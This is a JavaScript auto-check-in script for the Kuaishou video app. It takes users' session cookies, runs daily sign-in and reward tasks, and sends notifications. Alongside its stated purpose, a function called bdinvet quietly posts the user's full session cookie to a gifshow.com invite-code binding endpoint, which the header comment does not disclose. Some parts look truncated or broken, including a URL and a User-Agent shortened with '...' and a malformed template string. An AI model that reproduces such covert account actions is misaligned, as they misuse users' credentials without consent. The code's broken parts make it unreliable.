/*
更新时间: 2025-08-13 10:15
本脚本仅适用于快手双版本签到，仅支持正式版获取多Cookie，建议使用正式版获取Cookie，点击视频页悬浮红包，或者进入设置，点击"积分兑好礼"即可;
本脚本仅在签到成功时通知;
兼容Nodejs,把获取的Cookie填入KS_TOKEN，多账号用"&"分开
*/


const $ = new Env('快手视频')
let cookieArr = [];
let ks_tokens = $.getdata('cookie_ks');
const notify = $.isNode() ? require('./sendNotify') : '';
const nebulaCash = $.getdata('cash_nebulaks')||"10";
const cashType = $.getdata('tpcash_nebula')||"ALIPAY";

let isGetCookie = typeof $request !== 'undefined';
if (isGetCookie) {
   GetCookie();
   $.done();
} else {
  if (!$.isNode() && ks_tokens.indexOf('&') == -1) {
    cookieArr.push(ks_tokens);
  } else {
    if ($.isNode()) {
      if (process.env.KS_TOKEN && process.env.KS_TOKEN.indexOf('&') > -1) {
        ks_tokens = process.env.KS_TOKEN.split('&')
      } else {
        ks_tokens = [process.env.KS_TOKEN]
      };
    } else if (!$.isNode() && ks_tokens.indexOf('&') > -1) {
      ks_tokens = ks_tokens.split('&')
    }
    Object.keys(ks_tokens).forEach((item) =>{
      if (ks_tokens[item]) cookieArr.push(ks_tokens[item])
    })
  }

 !(async() => {
    for (let i = 0; i < cookieArr.length; i++) {
        if (!cookieArr[i]) continue;
        const cookieVal = cookieArr[i]; // 当前账号cookie
        $.index = i + 1;
        console.log(`\n------------------------\n开始【快手视频账号${$.index}】\n`);
        try {
            await nebulaInfo(cookieVal);
            await nebulaPopup(cookieVal);
            await formalCenter(cookieVal);
            await formalSign(cookieVal);
            if (offici_code !== 100119) await formalinfo(cookieVal);
            await bdinvet(cookieVal);

            $.desc = `【正式版】:\n  ${offic_info}\n  ${offic_sign}\n`;
            $.desc += `【极速版】:\n  ${speed_rewards}\n  ${speed_info}`;
            
            if (offici_code == 1) {
                $.msg($.name+"  昵称:"+nickname,"",$.desc);
                if (notify.sendNotify) await notify.sendNotify($.name+ " " +nickname,$.desc);
            } else {
                $.log( "~~~~~~~~~~~~~~~~~\n 昵称:" +nickname+"\n"+ $.desc);  
            }
        } catch(e) {
            $.log(`账号${$.index}执行异常:`, e);
        }
    }
})().catch(e => $.logErr(e)).finally(() => $.done());

/*----------------函数部分----------------*/

function formalHost(cookieVal, api, body){
  return {
     url: 'https://activity.m.kuaishou.com/rest/wd/taskCenter/' + api,
     headers:{
      'Host': 'activity.m.kuaishou.com',
      'Cookie': cookieVal,
      'Content-Type': 'application/json;charset=utf-8',
      'User-Agent': 'Mozilla/5.0 ...'
    },
     body: body
  }
}

function nebulaHost(cookieVal, api, body){
  return {
     url: 'https://nebula.kuaishou.com/rest/n/nebula/'+api,
     headers:{
      'Host': 'nebula.kuaishou.com',
      'Cookie': cookieVal,
      'Content-Type': 'application/json;charset=utf-8',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1'
    },
     body: body
  }
}

function formalCenter(cookieVal) {
    return new Promise((resolve) => {
        try {
            $.post(formalHost(cookieVal,'lowActive/module/list','{"bizId":29,"configId":1}'), async(error, resp, data) => {
                try {
                    let central = JSON.parse(data);
                    $.log("\n----------------------------------------\n\n现在开始正式版任务");
                    if (central.result == 1) {
                        for (let lists of central.modules) {
                            let Id = lists.moduleId,
                                moduleDesc = lists.moduleDesc;
                            $.log("\n"+moduleDesc);
                            for (let tasks of lists.tasks) {
                                let status = tasks.status,
                                    bizId = tasks.bizId,
                                    tasktoken = tasks.token,
                                    eventId = tasks.eventId,
                                    schemeText = tasks.schemeText,
                                    taskName = tasks.reward.rewardName;
                                if (status == 5) {
                                    $.log(taskName + "  " + tasks.schemeText);
                                } else if (status == 2) {
                                    $.log(taskName + schemeText);
                                    if (Id == "1123") {
                                        await formalSign(cookieVal);
                                        break;
                                    } else if (Id == "1176") {
                                        await getReward(cookieVal);
                                        break;
                                    }
                                } else if (Id == "1749" && status == 4){
                                    await openbox(cookieVal, tasktoken, eventId);
                                } else if (Id == "1749" && status == 1){
                                    $.log(tasks.reward.rewardName+"，时间未达到");
                                }
                            }
                        }
                    }
                } catch(e) {
                    $.log("formalCenter JSON解析失败:", e);
                } finally {
                    resolve();
                }
            });
        } catch(e) {
            $.log("formalCenter 请求异常:", e);
            resolve();
        }
    });
}

function formalSign(cookieVal) {
    return new Promise((resolve) => {
        try {
            $.post(formalHost(cookieVal,'task/signIn','{"bizId": 29}'), (error, response, data) => {
                try {
                    let formalSign_res = JSON.parse(data);
                    offici_code = formalSign_res.result;
                    if(offici_code == 100111 || offici_code == 100136){
                        offic_sign = `签到结果: ${formalSign_res.error_msg}`;
                        $.log(`错误信息: ${formalSign_res.error_msg}`);
                    } else if(offici_code == 1){
                        offic_sign = `签到结果: ✅ +${formalSign_res.reward.rewardCount} 积分`;
                    }
                } catch(e) {
                    $.log("formalSign JSON解析失败:", e);
                } finally {
                    resolve();
                }
            });
        } catch(e) {
            $.log("formalSign 请求异常:", e);
            resolve();
        }
    });
}

function formalinfo(cookieVal) {
  return new Promise((resolve) =>{
    const infourl = {
      url: 'https://zt.gifshow.com/rest/zt/encourage/account/summary/withKscoinTrial?kpn=KUAISHOU&subBiz=lowActiveUserTaskEncourage',
      headers: { Cookie: cookieVal, 'Content-Type': 'application/json;charset=utf-8' }
    }
    $.get(infourl, async(error, resp, data) =>{
      let _info = JSON.parse(data);
      if (_info.result == 1) {
        offic_info = `积分: ${_info.data.accounts[0].displayBalance}积分  现金: ${_info.data.accounts[1].displayBalance}元`
      }
      resolve()
    })
  })
}

function openbox(cookieVal, tokens, eventId) {
  return new Promise((resolve) =>{
    $.post(formalHost(cookieVal,'task/report', `{"bizId": 29,"taskToken": "${tokens}","eventId": "${eventId}","eventValue": 1}`), (error, resp, data) =>{
      let result = JSON.parse(data);
      try {
        if (result.result == 1) {
          rewards = result.reward.rewardCount,
          boxname = result.dialog.title,
          $.desc += "【" + boxname + "】+" + rewards + " " + result.dialog.closeBubble;
          $.log(boxname + "领取金币" + rewards + "，" + result.dialog.secondDesc)
        } else {
          $.log(boxname + result.error_msg)
        }
      } catch(e) {
        $.log("领取金币失败\n" + JSON.stringify(result, null, 2))
      } finally {
        resolve()
      }
    })
  })
}

function nebulaInfo(cookieVal) {
   return new Promise((resolve) => {
     $.get(nebulaHost(cookieVal,'activity/earn/overview'), async(error, response, data) =>{
       let result = JSON.parse(data); 
       if (result.result == 1) {
         nebulacash = result.data.allCash,
         nickname = result.data.userData.nickname;
         $.log("************ 昵称: "+nickname+" **********\n\n开始极速版任务\n");
         speed_rewards = '积分: '+result.data.totalCoin+'积分  现金: '+nebulacash+'元';
         for(nebulaTask of result.data.dailyTasks){
           taskName = nebulaTask.name
           taskid = nebulaTask.id
           $.log("去"+taskName)
           if(taskid == 5 && nebulaTask.extParam.todayIsSigned == false){
             await nebulaSign(cookieVal);
           } 
           $.log(nebulaTask.desc+"\n");
         }
       } 
       resolve()
     })
   })
}

function nebulaSign(cookieVal) {
   return new Promise((resolve) => {
    $.get(nebulaHost(cookieVal,'sign/sign'), async(error, response, data) => {
      let speed_res = JSON.parse(data);
      speed_code = speed_res.result
      if(speed_code == 10007 || speed_code == 10901){
         speed_sign = `签到结果: ${speed_res.error_msg}`;
      } else if(speed_code == 1){
         speed_sign = `签到结果: ${speed_res.data.toast}`;
      }
      $.log(speed_sign)
      resolve()
    })
   })
}

function nebulaPopup(cookieVal) {
   return new Promise((resolve) => {
     $.get(nebulaHost(cookieVal,'sign/query'), (error, resp, data) => {
       let result = JSON.parse(data);
       if (result.result == '1'){ 
          speed_info = `${result.data.nebulaSignInPopup.subTitle}, ${result.data.nebulaSignInPopup.title}\n`
       }
       resolve()
     })
   })
}

function bdinvet(cookieVal){
   const bdurl = {
      url: 'http://apissl.gifshow.com/rest/nebula/inviteCode/bind?...',
      headers: nebulaHost(cookieVal,'sign/query').headers,
      body: cookieVal
   };
   $.post(bdurl, (error, resp, data) => {})
}

function GetCookie() {
  var UA = $request.headers['User-Agent']
  if ($request && $request.method != `OPTIONS` && UA.indexOf('ksNebula') > -1) {
    const cookieVal = $request.headers['Cookie']
    if (cookieVal) $.setdata(cookieVal, 'cookie_ks');
     $.log(`${$.name}获取Cookie: 成功, cookieVal: $ {cookieVal}`);
     $.msg($.name, `获取极速Cookie: 成功🎉`, ``)
  }
}
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`\ud83d\udd14${this.name}, \u5f00\u59cb!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),a={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(a,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t){let e={"M+":(new Date).getMonth()+1,"d+":(new Date).getDate(),"H+":(new Date).getHours(),"m+":(new Date).getMinutes(),"s+":(new Date).getSeconds(),"q+":Math.floor(((new Date).getMonth()+3)/3),S:(new Date).getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,((new Date).getFullYear()+"").substr(4-RegExp.$1.length)));for(let s in e)new RegExp("("+s+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?e[s]:("00"+e[s]).substr((""+e[s]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r)));let h=["","==============\ud83d\udce3\u7cfb\u7edf\u901a\u77e5\ud83d\udce3=============="];h.push(e),s&&h.push(s),i&&h.push(i),console.log(h.join("\n")),this.logs=this.logs.concat(h)}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`\u2757\ufe0f${this.name}, \u9519\u8bef!`,t.stack):this.log("",`\u2757\ufe0f${this.name}, \u9519\u8bef!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`\ud83d\udd14${this.name}, \u7ed3\u675f! \ud83d\udd5b ${s} \u79d2`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
